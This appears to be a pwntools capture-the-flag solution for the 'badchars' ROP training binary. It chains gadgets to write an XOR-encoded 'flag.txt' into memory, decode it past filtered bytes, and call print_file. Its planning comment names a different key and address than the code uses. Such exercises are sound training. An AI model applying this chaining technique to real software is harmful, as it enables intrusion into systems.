#!/usr/bin/env python3
from pwn import *

# set up context
elf = context.binary = ELF('badchars')
context.log_level = 'debug'

# craft payload
'''
--- HIGH ---
funcptr -> print_file()

straddr -> 0x00601028
gadget  -> pop rdi; ret;

... from +1 to +7

gadget  -> xor byte ptr [r15], r14b; ret;
straddr -> 0x00601028 + 1
gadget  -> pop r15; ret;

gadget  -> xor byte ptr [r15], r14b; ret;
gadget  -> mov qword ptr [r13], r12; ret;
straddr -- 0x00601030 (to r15)
string  -- "a" key byte (to r14)
straddr -- 0x00601028 (to r13)
string  -- "flag.txt" XOR "a" (8 bytes) (to r12)
gadget  -> pop r12; pop r13; pop r14; pop r15; ret;
gadget  -> ret; (movaps alignment)
--- LOW  ---
'''

ret = 0x00000000004004ee        # ret;
pop_regs = 0x000000000040069c   # pop r12; pop r13; pop r14; pop r15; ret;
write_data = 0x0000000000400634 # mov qword ptr [r13], r12; ret;
xor_data = 0x0000000000400628   # xor byte ptr [r15], r14b; ret; 
straddr = 0x00601028 + 8        # .data (shifted to avoid badchar during decode)
pop_r15 = 0x00000000004006a2    # pop r15; ret;
pop_rdi = 0x00000000004006a3    # pop rdi; ret;
key = b'0'

def xor_rep(m: bytes, k: bytes) -> bytes:
    return bytes([ch ^ k[i % len(k)] for i, ch in enumerate(m)])

args = [
    { 40 : ret },
    pop_regs,
    xor_rep(b'flag.txt', key),  # r12
    straddr,                    # r13
    key*8,                      # r14 (r14b)
    straddr,                    # r15
    write_data,
]
for i in range(8):
    args.extend([ pop_r15, straddr + i, xor_data ])
args.extend([ pop_rdi, straddr, elf.symbols.print_file ])

payload = flat(*args)
open('payload.bin', 'wb').write(payload)

# send payload
io = process(elf.path)
io.recvuntil('> ')
io.sendline(payload)
io.recvuntil(b'Thank you!\n')
print(io.recvline().decode('utf-8'))
